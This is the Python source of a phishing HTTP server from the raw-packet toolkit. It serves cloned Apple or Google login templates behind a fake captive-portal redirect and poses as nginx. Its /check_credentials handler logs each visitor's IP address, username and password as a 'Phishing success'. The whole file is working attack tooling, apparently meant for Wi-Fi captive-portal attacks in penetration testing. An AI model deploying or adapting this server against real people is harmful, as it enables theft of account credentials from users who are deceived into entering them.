# region Description
"""
phishing.py: Phishing HTTP server (phishing)
Author: Vladimir Ivanov
License: MIT
Copyright 2020, Raw-packet Project
"""
# endregion

# region Import
from raw_packet.Utils.base import Base
from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn
from typing import List, Dict, Tuple, Callable, Union
from json import loads, decoder
from user_agents import parse as user_agent_parse
from os.path import abspath, dirname, isdir, isfile, join
from os import listdir
from socket import AF_INET6
# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2020, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.2.1'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Development'
__script_name__ = 'Make phishing HTTP pages (phishing)'
# endregion


# region Phishing HTTP Request Handler
class _PhishingHTTPRequestHandler(BaseHTTPRequestHandler):

    BaseHTTPRequestHandler.server_version = 'nginx'
    BaseHTTPRequestHandler.sys_version = ''
    # BaseHTTPRequestHandler.protocol_version = 'HTTP/1.1'
    # BaseHTTPRequestHandler.close_connection = True

    # region Errors
    def error_SendResponse(self, error_code: int):
        full_path: str = join(self.server.site_path + self.server.separator + 'errors' +
                              self.server.separator + str(error_code) + '.html')
        if isfile(full_path):
            response: bytes = open(full_path, 'rb').read()
        else:
            response: bytes = bytes('<html>ERROR</html>', encoding='utf-8')
        self.send_response(error_code)
        self.send_header('Content-Type', 'text/html; charset=UTF-8')
        self.send_header('Content-Length', str(len(response)))
        self.send_header('Connection', 'close')
        self.end_headers()
        self.wfile.write(response)

    def error_BadRequest(self):
        self.error_SendResponse(error_code=400)

    def error_FileNotFound(self):
        self.error_SendResponse(error_code=404)

    def error_NeedContentLegth(self):
        self.error_SendResponse(error_code=411)

    def error_CheckCreds(self):
        response: bytes = bytes('ERROR', 'utf-8')
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain; charset=UTF-8')
        self.send_header('Content-Length', str(len(response)))
        self.send_header('Connection', 'close')
        self.end_headers()
        self.wfile.write(response)

    def redirect(self):
        response: bytes = bytes('<HTML><HEAD><TITLE> Web Authentication Redirect</TITLE>'
                                '<META http-equiv="Cache-control" content="no-cache">'
                                '<META http-equiv="Pragma" content="no-cache">'
                                '<META http-equiv="Expires" content="-1">'
                                '<META http-equiv="refresh" content="1; URL=http://' + self.server.site_domain +
                                '/"></HEAD></HTML>', 'utf-8')
        self.send_response(302)
        self.send_header('Location', 'http://' + self.server.site_domain + '/')
        self.send_header('Content-Type', 'text/html; charset=UTF-8')
        self.send_header('Content-Length', str(len(response)))
        self.send_header('Connection', 'close')
        self.end_headers()
        self.wfile.write(response)
    # endregion

    # region Parse User-agent header
    @staticmethod
    def parse_user_agent(user_agent: Union[None, str]) -> Dict[str, str]:
        result: Dict[str, str] = {
            'os': 'Other',
            'browser': 'Other'
        }
        if user_agent is None:
            raise AttributeError('User-Agent header not found!')
        if 'CaptiveNetworkSupport' in user_agent and 'wispr' in user_agent:
            result['os']: str = 'Mac OS X'
            result['browser']: str = 'Captive'
        else:
            device = user_agent_parse(user_agent_string=user_agent)
            result['os']: str = device.os.family
            result['browser']: str = device.browser.family
        return result
    # endregion

    # region Check Host header
    def check_host(self, host: Union[None, str]) -> None:
        if host is None:
            raise AttributeError('Host header not found!')
        if self.headers['Host'] != self.server.site_domain:
            raise NameError
    # endregion

    # region Get full to file
    def _get_full_path(self, path: str = '/') -> str:
        if self.server.separator == '\\':
            path: str = path.replace('/', '\\')
        if path == self.server.separator:
            full_path: str = join(self.server.site_path + self.server.separator + 'index.html')
        else:
            full_path: str = join(self.server.site_path + self.path)
        return full_path
    # endregion

    # region Get content type by file extension
    def _get_content_type(self, path: str = '/index.html') -> str:
        content_type: str = 'text/plain'
        if path.endswith('.html'):
            content_type = 'text/html'
        elif path.endswith('.ico'):
            content_type = 'image/x-icon'
        elif path.endswith('.js'):
            content_type = 'text/javascript'
        elif path.endswith('.css'):
            content_type = 'text/css'
        elif path.endswith('.ttf'):
            content_type = 'font/ttf'
        elif path.endswith('.woff'):
            content_type = 'font/woff'
        elif path.endswith('.woff2'):
            content_type = 'font/woff2'
        elif path.endswith('.eot'):
            content_type = 'application/vnd.ms-fontobject'
        elif path.endswith('.gif'):
            content_type = 'image/gif'
        elif path.endswith('.png'):
            content_type = 'image/png'
        elif path.endswith('.svg'):
            content_type = 'image/svg+xml'
        elif path.endswith('.jpg') or path.endswith('.jpeg'):
            content_type = 'image/jpeg'
        elif path.endswith('.tif') or path.endswith('.tiff'):
            content_type = 'image/tiff'
        if path.endswith('.py'):
            self.error_FileNotFound()
        if path.endswith('.php'):
            self.error_FileNotFound()
        return content_type + '; charset=UTF-8'
    # endregion

    # region GET request
    def do_GET(self):
        try:
            user_agent: Dict[str, str] = self.parse_user_agent(self.headers['User-Agent'])
            self.check_host(self.headers['Host'])

            if self.server.site_path.endswith(self.server.separator + 'apple') and user_agent['os'] == 'Mac OS X':
                self.server.site_path += self.server.separator + 'macos_native'
                full_path = self._get_full_path(path=self.path)
            else:
                full_path = self._get_full_path(path=self.path)
            content_type = self._get_content_type(path=full_path)

            if isfile(full_path):
                response: bytes = open(full_path, 'rb').read()
                self.send_response(200)
                self.send_header('Content-Type', content_type)
                self.send_header('Content-Length', str(len(response)))
                self.send_header('Connection', 'close')
                self.end_headers()
                self.wfile.write(response)
            else:
                raise FileNotFoundError

        except AttributeError:
            self.error_BadRequest()

        except FileNotFoundError:
            self.error_FileNotFound()

        except NameError:
            self.redirect()
    # endregion

    # region POST request
    def do_POST(self):
        form: str = self.path
        if 'Content-Length' not in self.headers:
            self.error_NeedContentLegth()
        try:
            post_data: str = self.rfile.read(int(self.headers['Content-Length'])).decode('utf-8')
            post_data: Dict = loads(post_data)

            if form == '/check_username':
                response: bytes = bytes(post_data['username'], 'utf-8')
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain; charset=UTF-8')
                self.send_header('Content-Length', str(len(response)))
                self.send_header('Connection', 'close')
                self.end_headers()
                self.wfile.write(response)

            elif form == '/check_credentials':
                self.server.base.print_success('Phishing success!'
                                               ' Address: ', self.address_string(),
                                               ' Username: ', post_data['username'],
                                               ' Password: ', post_data['password'])
                self.error_CheckCreds()

            else:
                self.error_FileNotFound()

        except decoder.JSONDecodeError:
            self.error_BadRequest()

        except UnicodeDecodeError:
            self.error_BadRequest()

        except KeyError:
            self.error_CheckCreds()

        except UnboundLocalError:
            self.error_CheckCreds()
    # endregion

    # region HEAD request
    def do_HEAD(self):
        try:
            user_agent: Dict[str, str] = self.parse_user_agent(self.headers['User-Agent'])
            self.check_host(self.headers['Host'])

            full_path = self._get_full_path(path=self.path)
            content_type = self._get_content_type(path=self.path)

            if isfile(full_path):
                self.send_response(200)
                self.send_header('Content-Type', content_type)
                self.send_header('Connection', 'close')
                self.end_headers()
            else:
                raise FileNotFoundError

        except AttributeError:
            self.send_response(400)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

        except FileNotFoundError:
            self.send_response(404)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

        except NameError:
            self.send_response(302)
            self.send_header('Location', 'http://' + self.server.site_domain + '/')
            self.send_header('Connection', 'close')
            self.end_headers()

    # endregion

    # region Log messages
    def log_message(self, format, *args):
        if not self.server.quiet:
            user_agent = self.headers['User-Agent']
            host = self.headers['Host']
            if host is None:
                host = 'None'
            if user_agent is None:
                user_agent = 'None'
            parsed_user_agent = self.parse_user_agent(user_agent)
            self.server.base.print_info('Phishing client address: ', self.address_string(),
                                        ' os: ', parsed_user_agent['os'],
                                        ' browser: ', parsed_user_agent['browser'],
                                        ' host: ', host, ' request: ', '%s' % format % args)
    # endregion

# endregion


# region Phishing HTTP Server IPv4
class _PhishingHTTPServerIPv4(HTTPServer):
    def __init__(self,
                 server_address: Tuple[str, int],
                 RequestHandlerClass: Callable[..., BaseHTTPRequestHandler],
                 base_instance: Base,
                 site_path: str,
                 site_domain: Union[None, str] = None,
                 quiet: bool = False):
        super().__init__(server_address, RequestHandlerClass)
        self.site_path: str = site_path
        self.site_domain: str = site_domain
        self.base: Base = base_instance
        self.quiet: bool = quiet
        if self.base.get_platform().startswith('Windows'):
            self.separator: str = '\\'
        else:
            self.separator: str = '/'
# endregion


# region Phishing HTTP Server IPv6
class _PhishingHTTPServerIPv6(HTTPServer):
    address_family = AF_INET6

    def __init__(self,
                 server_address: Tuple[str, int],
                 RequestHandlerClass: Callable[..., BaseHTTPRequestHandler],
                 base_instance: Base,
                 site_path: str,
                 site_domain: Union[None, str] = None,
                 quiet: bool = False):
        super().__init__(server_address, RequestHandlerClass)
        self.site_path: str = site_path
        self.site_domain: str = site_domain
        self.base: Base = base_instance
        self.quiet: bool = quiet
        if self.base.get_platform().startswith('Windows'):
            self.separator: str = '\\'
        else:
            self.separator: str = '/'
# endregion


# region Multi Threaded Phishing Server IPv4
class _MultiThreadedPhishingServerIPv4(ThreadingMixIn, _PhishingHTTPServerIPv4):
    """
    Handle requests in a separate thread.
    """
# endregion


# region Multi Threaded Phishing Server IPv6
class _MultiThreadedPhishingServerIPv6(ThreadingMixIn, _PhishingHTTPServerIPv6):
    """
    Handle requests in a separate thread.
    """
# endregion


# region class Phishing Server
class PhishingServer:
    """
    Phishing HTTP server (phishing)
    """

    # region Variables
    _base: Base = Base(admin_only=True, available_platforms=['Linux', 'Darwin', 'Windows'])
    # endregion

    # region Start Phishing
    def start(self,
              address: str = '0.0.0.0',
              port: int = 80,
              site: str = 'apple',
              redirect: str = 'authentication.net',
              quiet: bool = False):
        """
        Start Phishing HTTP server
        :param address: IPv4 address for listening (default: '0.0.0.0')
        :param port: TCP port for listening (default: 80)
        :param site: Set full path to site or phishing site template 'apple' or 'google' (default: 'apple')
        :param redirect: Set phishing site domain for redirect (default: 'authentication.net')
        :param quiet: Quiet mode
        :return: None
        """
        if '::' in address:
            self._base.print_info('Wait IPv6 HTTP requests ...')
        else:
            self._base.print_info('Wait IPv4 HTTP requests ...')
        phishing: Union[None, _MultiThreadedPhishingServerIPv4, _MultiThreadedPhishingServerIPv6] = None
        try:
            if self._base.get_platform().startswith('Windows'):
                separator: str = '\\'
            else:
                separator: str = '/'
            if separator in site:
                site_path = site
                assert isdir(site_path), \
                    'Could not found site path: ' + self._base.error_text(site_path)
            else:
                directories: List[str] = list()
                current_path: str = dirname(abspath(__file__))
                files: List[str] = listdir(current_path)
                for file in files:
                    path: str = join(current_path + separator + file)
                    if isdir(path):
                        directories.append(path)
                site_path: str = join(current_path + separator + site)
                assert site_path in directories, \
                    'Could not found site template: ' + self._base.error_text(site) + \
                    ' in templates directory: ' + self._base.info_text(current_path)

            if '::' in address:
                phishing = \
                    _MultiThreadedPhishingServerIPv6(server_address=(address, port),
                                                     RequestHandlerClass=_PhishingHTTPRequestHandler,
                                                     base_instance=self._base,
                                                     site_path=site_path,
                                                     site_domain=redirect,
                                                     quiet=quiet)
            else:
                phishing = \
                    _MultiThreadedPhishingServerIPv4(server_address=(address, port),
                                                     RequestHandlerClass=_PhishingHTTPRequestHandler,
                                                     base_instance=self._base,
                                                     site_path=site_path,
                                                     site_domain=redirect,
                                                     quiet=quiet)
            phishing.serve_forever()

        except OSError:
            if not quiet:
                self._base.print_error('Port: ', str(port), ' already listen!')
            exit(1)

        except KeyboardInterrupt:
            if phishing is not None:
                phishing.server_close()
            if not quiet:
                self._base.print_info('Exit')
            exit(0)

        except AssertionError as Error:
            if phishing is not None:
                phishing.server_close()
            if not quiet:
                self._base.print_error(Error.args[0])
            exit(1)

    # endregion

# endregion
